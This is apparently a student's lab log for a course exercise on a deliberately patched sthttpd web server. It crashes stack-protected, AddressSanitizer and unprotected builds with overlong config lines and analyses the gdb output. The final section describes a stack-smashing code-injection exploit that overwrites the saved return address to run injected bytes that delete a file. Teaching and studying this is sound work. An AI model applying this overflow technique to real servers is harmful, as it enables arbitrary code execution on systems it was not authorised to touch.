@@ -1,0 +1,299 @@
+First I check gcc and find out that the path is wrong.
+
+export PATH=/usr/local/cs/bin:$PATH
+
+and then, I check which gcc and get the correct path.
+
+Then I downloaded sthttpd 2.27.0 by doing
+
+wget http://web.cs.ucla.edu/classes/spring17/cs33/lab/sthttpd-2.27.0.tar.gz
+
+This made a file sthttpd-2.27.0.tar.gz in my current directory.
+
+Then I made the patch file with
+
+touch patch.diff
+
+and opened it in emacs and pasted the following
+
+--- sthttpd-2.27.0/src/thttpd.c	2014-10-02 15:02:36.000000000 -0700
++++ sthttpd-2.27.0-delta/src/thttpd.c	2015-04-30 19:15:24.820042000 -0700
+@@ -999,7 +999,7 @@ static void
+ read_config( char* filename )
+     {
+     FILE* fp;
+-    char line[10000];
++    char line[100];
+     char* cp;
+     char* cp2;
+     char* name;
+@@ -1012,7 +1012,7 @@ read_config( char* filename )
+ 	exit( 1 );
+ 	}
+
+-    while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
++    while ( fgets( line, 1000, fp ) != (char*) 0 )
+ 	{
+ 	/* Trim comments. */
+ 	if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+
+Then I extracted the tar file with
+
+tar -xzf sthttpd-2.27.0.tar.gz
+
+which made a directory sthttpd-2.27.0. I applied the patch with
+
+patch -p0 <patch.diff
+
+which gave the result
+
+patching file sthttpd-2.27.0/src/thttpd.c
+patch unexpectedly ends in middle of line
+Hunk #2 succeeded at 1012 with fuzz 1.
+
+And then I add a return after the codes in patch.diff
+
+patch -p0 -R <patch.diff
+patch -p0 <patch.diff
+
+and it worked with no messages other than
+
+patching file sthttpd-2.27.0/src/thttpd.c
+
+Then I create thttpd-sp, thttpd-as, thttpd-no with
+the commands on website with different CFLAGS
+
+Then I calculate the value of the 3 equations:
+(12330 + 3 * (104756697 % 293) + 1)
+12673
+(12330 + 3 * (104756697 % 293) + 2)
+12674
+(12330 + 3 * (104756697 % 293) + 3)
+12675
+
+When I debug 3 servers with my test file on another
+terminal using 'curl', both sp and no outputs correcctly
+without errors. The only error happened when I run 
+thttpd-as and the program aborts after I run the curl
+command on another server:
+
+The ports and servers were as follows
+
+port	    server variant
+12673	    thttpd-sp
+12674	    thttpd-as
+12675       thttpd-no
+
+Then I started crashing the program with gdb, backtrace and its
+disassembly code to check the stack. Since the patch has
+something to do with the fgets function, so the bug has something
+to do with the input and read.
+
+For thttpd-sp:
+I created a config.txt with:
+user=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+and then in gdb I ran thttpd-sp with
+
+run -p 12840 -D -C config.txt
+
+This successfully crashed the program. This happened because the program
+overwrote a canary value which indicated to the program that the stack was
+written to improperly. I had to choose a string that was sufficiently long so
+that this would occur, it had to be greater than 100 because that was the
+allocated memory for the lines variable. The backtrace from gdb after the 
+crash was:
+
+#0  0x00007ffff76121d7 in raise () from /lib64/libc.so.6
+#1  0x00007ffff76138c8 in abort () from /lib64/libc.so.6
+#2  0x00007ffff7651f07 in __libc_message () from /lib64/libc.so.6
+#3  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#4  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#5  0x0000000000404cb3 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#6  0x0000000000405040 in parse_args (argc=6, argv=0x7fffffffe2a8)
+    at thttpd.c:893
+#7  0x0000000000403559 in main (argc=<optimized out>, argv=<optimized out>)
+    at thttpd.c:380
+
+I set a breakpoint at thttpd.c:1190 and ran thttpd-sp again with the same arguments. 
+And get following assebly code:
+
+   0x0000000000404f23 <read_config+1219>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
+   0x0000000000404f28 <read_config+1224>:       64 48 33 04 25 28 00 00 00     xor    %fs:0x28,%rax
+   0x0000000000404f31 <read_config+1233>:       0f 85 1a 01 00 00       jne    0x405051 <read_config+1521>
+   0x0000000000404f37 <read_config+1239>:       48 83 c4 70     add    $0x70,%rsp
+
+   0x0000000000405051 <read_config+1521>: e8 5a d4 ff ff callq 0x4024b0 <__stack_chk_fail@plt>
+
+This calls a function that signals that the check for the stack canary failed
+and crashes the program. The canary is located at 0x68(%rsp), and does not match
+it's correct value at %fs:0x28 because it was overwritten.
+
+For thttpd-as:
+I use the same config.txt file.
+I got an error message that was as follows:
+
+==40315==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffce54 
+at pc 0x00000043aec9 bp 0x7fffffffcdb0 sp 0x7fffffffc560
+READ of size 106 at 0x7fffffffce54 thread T0
+    #0 0x43aec8 in __interceptor_strchr ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+    #1 0x4e0b50 in read_config /u/eng/class/classenm/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:1018
+    #2 0x4e164e in parse_args /u/eng/class/classenm/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:893
+    #3 0x408297 in main /u/eng/class/classenm/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:380
+    #4 0x7ffff6cc6b34 in __libc_start_main (/lib64/libc.so.6+0x21b34)
+    #5 0x4093f9  (/w/home.16/class/classenm/cs33/lab3/sthttpd-2.27.0/src/thttpd-as+0x4093f9)
+
+Address 0x7fffffffce54 is located in stack of thread T0 at offset 132 in frame
+    #0 0x4e0a9f in read_config /u/eng/class/classenm/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:1000
+
+  This frame has 1 object(s):
+    [32, 132) 'line' <== Memory access at offset 132 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: 
+stack-buffer-overflow ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468 in __interceptor_strchr
+Shadow bytes around the buggy address:
+  0x10007fff7970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff7980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff7990: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff79a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff79b0: 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00
+=>0x10007fff79c0: 00 00 00 00 00 00 00 00 00 00[04]f4 f4 f4 f3 f3
+  0x10007fff79d0: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff79e0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4
+  0x10007fff79f0: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00
+  0x10007fff7a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2
+  0x10007fff7a10: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==40315==ABORTING
+
+
+I made a breakpoint at thttpd.c:1018 and saw that the program crashed during 
+the call to strchr on line 1018 of thttpd.c. The assembly code was:
+
+   0x00000000004e0b43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
+   0x00000000004e0b47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
+   0x00000000004e0b4c <read_config+188>:        
+   e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>
+   0x00000000004e0b51 <read_config+193>:        48 85 c0        test   %rax,%rax
+   0x00000000004e0b54 <read_config+196>:        74 24   je     0x4e0b7a <read_config+234>
+
+Because this calls a function that goes through the line array and eventually
+goes past the last address that is allocated to line. This invokes the address
+sanitizer which crashes the program to protect from a stack buffer overflow.
+
+For thttpd-no:
+I firstly use the same config.txt. However, the server does
+not crash. Then I rewrite the config.txt to:
+
+user=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+This causes a segmentation fault:
+
+#0  0x0000000000404a80 in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x0041414141414141 in ?? ()
+#2  0x00007fffffffe500 in ?? ()
+
+I set a breakpoint atthttpd.c:1190 and ran with config.txt having 159 characters as before. 
+The last instruction executed was:
+
+
+   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
+   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
+   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
+   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
+   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
+   0x0000000000404d9f <read_config+1215>:       c3      retq
+
+%rip was set to a value stored on the stack
+that was the location one instruction after the code that called read_config
+Read_config writes to unallocated memory in the line array, which overwrites the
+return value on the stack for read_config. So when read_config returns, %rip is
+set to 0x0041414141414141, which is not a location that contains an
+instruction. So the program crashes.
+
+Then I created the .s files with:
+gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+gcc -S -O2 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
+gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s
+
+
+I managed to delete target.txt by injecting code onto the stack. My exploit only works in gdb, due to aslr being turned off with debugging.
+First, I ran the server in gdb, with a breakpoint in read_config to check the stack and location of registers.
+
+First, I created a file exploit.txt, containing "port=target.txt"
+I then appended a hex to raw converted zero-byte to the end.
+
+$ gdb --args src/thttpd-no -p 12585 -D -C exploit.txt
+(gdb) break read_config
+(gdb) run
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffd070:
+ rip = 0x4048c0 in read_config (thttpd.c:1000); saved rip = 0x4051bf
+ called by frame at 0x7fffffffd0b0
+ source language c.
+ Arglist at 0x7fffffffd060, args: filename=0x7fffffffe5f6 "exploit.txt"
+ Locals at 0x7fffffffd060, Previous frame's sp is 0x7fffffffd070
+ Saved registers:
+  rip at 0x7fffffffd068
+
+This specified that the saved rip points to location 0x7fffffffd068, so if I could overflow the buffer all the way to that spot,
+then I could try to store a pointer to my own function into location 0x7fffffffd068, so that when read_config returns,
+rip will have a pointer to my own code.
+
+I wrote a function in delete.c using asm() with a syscall to unlink the file target.txt. This required storing 0x57 into %rax,
+then passing a pointer to "target.txt" (stored on buffer) into %rdi first. To find the location of "target.txt," I used gdb:
+(gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffcfd0
+
+Then I counted some initial offset, since the buffer actually starts with "port=target.txt\0..." so target.txt\0 really starts at 0x7fffffffcfd5.
+This is the value I placed into rdi before the syscall to unlink.
+
+Next, I got the assembly of delete.c, then converted to bytecode with objdump:
+$ gcc -O2 -c delete.c
+$ objdump -d delete.o
+I extracted the bytecode from this, converted the hex chars to raw values, and appended it to my exploit.txt file:
+$ cat hexdelete.txt | ../hex2raw > rawdelete.txt
+$ cat rawdelete.txt >> exploit.txt
+
+I added some random chars to the end of exploit.txt, then appended the address of the start of my bytecode to the very end,
+at the location where the string would overflow into rip. This was done with trial and error and by printing the stack in gdb using x/50x $sp.
+In the end, I verified that I had the right values stored to the right locations:
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffd070:
+ rip = 0x404d77 in read_config (thttpd.c:1189); saved rip = 0x7fffffffcfe0
+ called by frame at 0x7fffffffd078
+ source language c.
+ Arglist at 0x7fffffffcfc8, args: filename=<optimized out>
+ Locals at 0x7fffffffcfc8, Previous frame's sp is 0x7fffffffd070
+ Saved registers:
+  rbx at 0x7fffffffd040, rbp at 0x7fffffffd048, r12 at 0x7fffffffd050,
+  r13 at 0x7fffffffd058, r14 at 0x7fffffffd060, rip at 0x7fffffffd068
+
+This checks that the valued stored into saved rip = 0x7fffffffcfe0, which is the value I want, since this is the location of the start of my bytecode in the buffer.
+This can be verified by checking the contents of the stack against the file hexdelete.txt, which contains the hex version of my delete() function.
+
